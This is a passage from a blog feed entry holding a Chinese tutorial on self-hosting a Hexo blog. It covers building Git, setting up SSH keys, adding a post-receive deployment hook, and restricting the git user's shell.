href="https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.9.5.tar.gz" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.9.5.tar.gz</a><br>tar -zxvf git-2.9.5.tar.gz</p></blockquote><blockquote><p><strong>&#x7F16;&#x8BD1;&#x5B89;&#x88C5;</strong><br>cd git-2.9.5<br>make prefix=/usr/local/git all<br>make prefix=/usr/local/git install<br>echo &#x201C;export PATH=$PATH:/usr/local/git/bin&#x201D; &gt;&gt; /etc/bashrc    //#&#x6DFB;&#x52A0;&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>source /etc/bashrc    ##&#x4F7F;&#x914D;&#x7F6E;&#x7ACB;&#x5373;&#x751F;&#x6548;</p></blockquote><blockquote><p><strong>&#x8BBE;&#x7F6E;Git&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;</strong></p><p>#ln -s /usr/local/git/bin/git-upload-pack /usr/bin/git-upload-pack</p><p>#ln -s /usr/local/git/bin/git-receive-pack /usr/bin/git-receive-pack</p></blockquote><blockquote><p><strong>&#x521B;&#x5EFA;git&#x7528;&#x6237;&#x7EC4;&#x548C;&#x7528;&#x6237;,&#x7528;&#x6765;&#x8FD0;&#x884C;Git&#x670D;&#x52A1;</strong></p><p>#groupadd git</p><p>   #useradd git -g git</p><p>   #passwd git<br>   &#x5207;&#x6362;&#x5230;git&#x7528;&#x6237;</p><p>   #su - git</p></blockquote><blockquote><p><strong>&#x8BBE;&#x7F6E;&#x7528;&#x6237;&#x6743;&#x9650;</strong></p><p>##git&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;:</p><p>#mkdir .ssh     ##&#x65B0;&#x5EFA;&#x6587;&#x4EF6;&#x5939;</p><p>#chmod 700 .ssh</p><p>#touch .ssh/authorized_keys     ##&#x65B0;&#x5EFA;&#x6587;&#x4EF6;</p><p>#chmod 600 .ssh/authorized_keys<br>cd /home<br>chown -R git:git git&#x8BBE;&#x7F6E;git&#x6587;&#x4EF6;&#x5939;&#x6240;&#x6709;&#x8005;&#xFF0C;&#x53BB;&#x9664;&#x65E0;&#x5173;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;</p></blockquote><blockquote><p><strong>&#x4FEE;&#x8EAB;ssh&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5F00;&#x542F;RSA&#x8BA4;&#x8BC1;</strong></p><p>#vi /etc/ssh/sshd_config</p></blockquote><pre><code>#&#x627E;&#x5230;&#x5982;&#x4E0B;&#x4E09;&#x4E2A;&#x9009;&#x7EBF;&#xFF0C;&#x4FEE;&#x6539;1.RSAAuthentication yes2.PubkeyAuthentication yes3.AuthorizedKeysFile home/git/.ssh/authorized_keys</code></pre><blockquote><p>&#x4FDD;&#x5B58;:wq<br>&#x56DE;&#x5230;&#x672C;&#x5730;&#x673A;&#x5668;&#xFF0C;&#x5C06;&#x521A;&#x624D;&#x751F;&#x6210;&#x7684;SSH&#x5BC6;&#x94A5;&#x5BFC;&#x51FA;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;</p></blockquote><blockquote><p>scp .ssh/id_rsa.pub <a href="mailto:root@192.168.1.2" target="_blank" rel="noopener">root@192.168.1.2</a>:/home/git/.ssh/authorized_keys<br>&#x6211;&#x7684;win10&#x7CFB;&#x7EDF;&#x662F;&#x81EA;&#x5E26;&#x6709;scp&#x547D;&#x4EE4;&#x7684;&#xFF0C;win7&#x53EF;&#x80FD;&#x6CA1;&#x6709;&#xFF0C;&#x53EF;&#x4EE5;&#x6253;&#x5F00;git bash&#x547D;&#x4EE4;&#x884C;&#xFF0C;git&#x5DE5;&#x5177;&#x6709;&#xFF0C;&#x6216;&#x8005;&#x5B89;&#x88C5;putty&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;pscp</p></blockquote><hr><h2 id="&#x90E8;&#x7F72;hexo&#x535A;&#x5BA2;"><a href="#&#x90E8;&#x7F72;hexo&#x535A;&#x5BA2;" class="headerlink" title="&#x90E8;&#x7F72;hexo&#x535A;&#x5BA2;"></a>&#x90E8;&#x7F72;hexo&#x535A;&#x5BA2;</h2><blockquote><h4 id="&#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;"><a href="#&#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;" class="headerlink" title="&#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;"></a>&#x521D;&#x59CB;&#x5316;git&#x4ED3;&#x5E93;</h4><p>#cd /home/git</p><p>#git init &#x2013;bare blog.git</p><p>#chown -R git:git blog.git     ##&#x6BCF;&#x751F;&#x6210;&#x4E00;&#x4E2A;git&#x4ED3;&#x5E93;&#x90FD;&#x8981;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x6743;&#x9650;</p></blockquote><blockquote><h5 id="&#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;"><a href="#&#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;" class="headerlink" title="&#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;"></a>&#x514B;&#x9686;&#x4ED3;&#x5E93;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6D4B;&#x8BD5;&#x672C;&#x5730;&#x673A;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x901A;</h5><p>git clone git@your-ip:/home/git/blog.git</p><blockquote><p>&#x2026;<br>warning: You appear to have cloned an empty repository.<br>&#x2026;</p></blockquote></blockquote><blockquote><h4 id="&#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone"><a href="#&#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone" class="headerlink" title="&#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone"></a>&#x5728;web&#x76EE;&#x5F55;&#x4E0B;clone</h4><p>&#x8FD9;&#x91CC;&#x6211;&#x76F4;&#x63A5;&#x4F7F;&#x7528;Apache&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4E3A;&#x522B;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;mkdir /var/www/hexo-blog</p></blockquote><blockquote><p>git clone /home/git/blog.gig /var/www/html<br>chown -R git:git /var/www/html</p></blockquote><blockquote><h4 id="&#x8BBE;&#x7F6E;Git-Hook"><a href="#&#x8BBE;&#x7F6E;Git-Hook" class="headerlink" title="&#x8BBE;&#x7F6E;Git Hook"></a>&#x8BBE;&#x7F6E;Git Hook</h4><p>&#x4F7F;&#x7528;Git Hook&#x628A;Hexo&#x751F;&#x6210;&#x7684;&#x9759;&#x6001;web&#x8D44;&#x6E90;&#x81EA;&#x52A8;&#x90E8;&#x7F72;&#x5230;web&#x76EE;&#x5F55;&#x4E0B;<br>vim /home/git/hooks/post-receive<br>&#x5728;DeployPath=&#x201D;&#x201D;&#x4E2D;&#x586B;&#x5165;&#x4F60;&#x7684;web&#x76EE;&#x5F55;</p></blockquote><pre><code>#!/bin/bash#author: @illgo#author blog: http://www.illgo.cn/#&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;IS_BARE=$(git rev-parse --is-bare-repository)if [ -z &quot;$IS_BARE&quot; ]; thenecho &gt;&amp;2 &quot;fatal: post-receive: IS_NOT_BARE&quot;exit 1fiunset GIT_DIRDeployPath=&quot;/var/www/html/&quot;echo &quot;===============================================&quot;cd $DeployPathecho &quot;deploying the myblog web&quot;#git stash#git pull origin mastergit fetch --allgit reset --hard origin/mastertime=`date`echo &quot;web server pull at webserver at time: $time.&quot;echo &quot;================================================&quot;</code></pre><blockquote><h4 id="&#x914D;&#x7F6E;Git&#x90E8;&#x7F72;"><a href="#&#x914D;&#x7F6E;Git&#x90E8;&#x7F72;" class="headerlink" title="&#x914D;&#x7F6E;Git&#x90E8;&#x7F72;"></a>&#x914D;&#x7F6E;Git&#x90E8;&#x7F72;</h4><p>&#x56DE;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x5207;&#x6362;&#x5230;&#x4F60;&#x751F;&#x6210;&#x7684;hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;<br>cd blog<br>npm install hexo-deployer-git<br>&#x5B89;&#x88C5;hexo&#x7684;Git&#x90E8;&#x7F72;&#x4F9D;&#x8D56;&#x5305;</p></blockquote><h4 id="&#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;-config-yml-&#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;"><a href="#&#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;-config-yml-&#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;" class="headerlink" title="&#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;_config.yml, &#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;"></a>&#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;_config.yml, &#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;</h4><pre><code>type: gitrepo: git@your-ip:/home/git/blog.git</code></pre><blockquote><p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</p></blockquote><h4 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h4><p>&#x51FA;&#x4E8E;&#x5B89;&#x5168;&#x8003;&#x8651;&#xFF0C;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;git&#x7528;&#x6237;&#x6743;&#x9650;,&#x7981;&#x6B62;shell&#x767B;&#x5F55;</p><blockquote><p>&#x627E;&#x5230;git&#x7528;&#x6237;&#x4FE1;&#x606F;<br>vim /etc/passwd</p></blockquote><pre><code>git:x:502:502::/home/git:/bin/bash## &#x6539;&#x4E3A;git:x:502:502::/home/git:/usr/local/git/bin/git-shell</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;使用服务器搭建Hexo个人博客详细&quot;&gt;&lt;a href=&quot;#使用服务器搭建Hexo个人博客详细&quot; class=&quot;headerlink&quot; title=&quot;使用服务器搭建Hexo个人博客详细&quot;&gt;&lt;/a&gt;使用服务器搭建Hexo个人博客&lt;code&gt;详细&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;在学习的过程中，被动接受知识对你的提高是轻微的；&lt;br&gt;只有主动学习，主动思考，才能学习的透彻，至少是高于被动学习吧。&lt;br&gt;搭建个人博客，最大化的利用你所学的知识，检验是否学习的透彻。&lt;/p&gt;
    
    </summary>
    
      <category term="默认" scheme="https://marnm.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
      <category term="默认" scheme="https://marnm.github.io/tags/%E9%BB%98%E8%AE%A4/"/>
    
  </entry>
  
</feed>
